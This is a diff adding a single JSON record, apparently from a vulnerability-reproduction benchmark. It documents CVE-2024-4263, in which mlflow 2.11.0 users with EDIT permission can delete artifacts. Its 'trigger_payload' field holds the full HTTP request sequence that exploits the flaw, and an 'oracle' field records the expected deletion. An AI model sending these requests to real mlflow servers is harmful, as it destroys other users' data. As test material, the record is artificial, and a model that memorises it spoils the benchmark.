@@ -1,0 +1,15 @@
+{
+  "file_id": "181_mlflow_huntr_bfa116d3-2af8-4c4a-ac34-ccde7491ae11",
+  "numeric_id": "181",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Broken access control allows low privilege users with EDIT permission to delete artifacts",
+  "cve": "CVE-2024-4263",
+  "cwe": "CWE-284: Improper Access Control",
+  "library": "mlflow",
+  "affected_version": "== 2.11.0",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "POST /api/2.0/mlflow/experiments/permissions/create HTTP/1.1\nHost: {BASE_URL}\nUser-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://{BASE_URL}/\nContent-Type: application/json\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\nConnection: close\nCookie: _ga_R1FN4KJKJH=GS1.1.1709044114.12.1.1709044119.0.0.0; _ga=GA1.1.860805038.\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nContent-Length: 81\n{\"username\":\"testing\",\"experiment_id\":\"795740547060925173\",\"permission\":\"EDIT\"}\n\nDELETE /api/2.0/mlflow-artifacts/artifacts/795740547060925173/ HTTP/1.1\nHost: {BASE_URL}\nUser-Agent: mlflow-python-client/2.11.0\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nConnection: close\nAuthorization: Basic dGVzdGluZzp0ZXN0aW5n",
+  "oracle": "Directory inside artifact is deleted"
+}
